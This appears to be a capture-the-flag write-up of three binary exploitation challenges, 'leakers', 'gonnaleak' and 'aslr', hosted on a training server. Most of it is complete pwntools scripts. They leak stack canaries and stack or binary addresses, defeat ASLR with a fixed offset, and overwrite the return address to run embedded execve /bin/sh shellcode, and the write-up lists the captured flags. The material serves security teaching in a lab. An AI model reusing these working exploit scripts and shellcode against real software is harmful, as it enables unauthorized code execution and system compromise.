# leakers ![c](https://img.shields.io/badge/solved-success)
### Analysis
This challenge is again on a *buffer overflow* vulnerability, as we can immediately see from the disassembled source code on ```Ghidra```. However, this time we can see through ```checksec ./leakers``` that a **canary** mitigation is enabled.

Btw we can easily bypass it by exploiting the fact that there is a printf in the code that, as we know, prints strings until it finds a null byte 0x00. Moreover, a canary typically is right before the EIP and has a leading 0 in order to not be leaked easily (is little endian, so the zero is "at the end").

### Exploit
With this knowledge we can send some A's and analyze the memory after this point with ```x /20gx *buffer_address*```, and notice the presence of the canary after 104 bytes. After leaking and receiving it we can fully exploit this.

First of all we send our shellcode in the first iteration of the loop to store it, then we get the canary by sending the 104 'A's and after that we overwrite the Saved IP in order to jump to our code (in this case we know the address of the buffer from a quick Ghidra exploration).

This exploit follows the standard procedure to exploit the canary mitigation, where we leak it and then we craft the payload as SHELLCODE + CANARY + XXXX + SHELLCODE_ADDRESS 

```python
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
r = remote("training.jinblack.it", 2010)

shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8

r.send(shellcode)
time.sleep(0.1)

r.send("A"*105)
time.sleep(0.1)
r.recvuntil("> ")
r.recv(105)
canary = u64(b"\x00" + r.recv(7))
print("0x%x" % canary)

wheretojump = 0x00404080

payload = b"A" * 104 + p64(canary) + b"B"*8 + p64(wheretojump)

r.send(payload)
time.sleep(0.1)

r.interactive()
```

**flag{canary_may_not_die!}**


# gonnaleak ![c](https://img.shields.io/badge/solved-success)
### Analysis
This is pretty much the same of the previous one, in fact also the script is very similar. 

The main difference is that we don't know the buffer address, and we can't see it from Ghidra. That's the reason why we must leak also this one. So the plan now is:
- leak the canary by sending 105 'A's
- leak the buffer address by sending 136 'A's
- craft a shellcode with NOPs before it, to be stored in the overflowed buffer
- send the final payload, with NOP + SHELLCODE + CANARY + XXXX + SHELLCODE_ADDRESS (actually jump to NOP sled, and then we will reach the shellcode)

### Exploit
```python
from pwn import *
import time

#context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['terminator', '-e']

r = remote("training.jinblack.it", 2011)

shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8
shellcode = shellcode.rjust(104, b"\x90")

r.send("A"*(105))
time.sleep(0.1)
r.recvuntil("> ")
r.recv(105)
canary = u64(b"\x00" + r.recv(7))
print("0x%x" % canary)

r.send("A"*(136))
time.sleep(0.1)
r.recvuntil("> ")
r.recv(136)

wheretojump = u64(r.recv(6) + b"\x00"*2)
print("0x%x" % wheretojump)
wheretojump = wheretojump - 0x150
print("0x%x" % wheretojump)

payload = shellcode + p64(canary) + b"B"*8 + p64(wheretojump)

r.send(payload)
time.sleep(0.1)

r.interactive()
```

Flag: **flag{you_can_also_leak_the_stack!}**

# aslr ![c](https://img.shields.io/badge/solved-success)
### Analysis
Same procedure to get the canary, we just send 105 'B's to get the leak.
Then because ASLR is enabled we have to calculate the offset (that is fixed) between an address in the stack that we can constantly leak, and the base address of the bss that we can easily see from gdb with the *info files* command. 

After trying to compute this offset for some cases, we can see that is always the same, so now we can compute everything on the bss starting from there. That is, **we know that the buffer address will always change so we can't hardcode it or compute it like in gonnaleak (with a simple subtraction), but knowing an offset is done (because ASLR works with PAGES, and within a page we don't have additional randomization**.
### Exploit
```python
from pwn import *
import time
'''
context.terminal = ['tmux', 'splitw', '-h']
r = process("./aslr")
gdb.attach(r, """
	c
	""")
'''
r = remote("training.jinblack.it", 2012)

shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8
r.send(shellcode)
time.sleep(0.1)

r.send("B"*105)
time.sleep(0.1)
r.recvuntil("> ")
r.recv(105)
canary = u64(b"\x00" + r.recv(7))
print("canary 0x%x" % canary)

offset = 0x2005c0
r.send("A"*112)
time.sleep(0.1)
r.recvuntil("> ")
r.recv(112)
add = u64(r.recv(8) + b"\x00" + b"\x00") 
add = add + offset
payload = b"a"*104 + p64(canary) + b"b"*8 + p64(add)
r.send(payload)

r.interactive()
```
**flag{you_can_also_leak_the_binary_And_compute_bss!}**
